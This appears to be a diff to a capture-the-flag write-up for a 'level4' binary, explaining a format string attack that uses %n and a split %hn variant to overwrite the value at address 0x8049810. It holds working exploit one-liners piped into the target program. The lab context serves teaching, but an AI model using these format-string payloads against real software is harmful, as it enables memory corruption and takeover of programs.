@@ -25,7 +25,9 @@ but we want to write in 0x8049810 who is the address send by p and compared with
 so we use the format specifer n who print the number of characters who was already 
 write in the string.
 
-
 the exploit : python -c 'print "\x10\x98\x04\x08%16930112x" + "%12$n"' | ./level4
 
-python -c 'print "\x10\x98\x04\x08%16930112x" + "%12$n"' | ./level4
+Instead of writing 16 million characters, we can also split the %n over 2 bytes
+twice by using %hn. In this case, the event looks like this:
+
+python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%21820x%12$hn%43966x%13$hn"' | ./level4
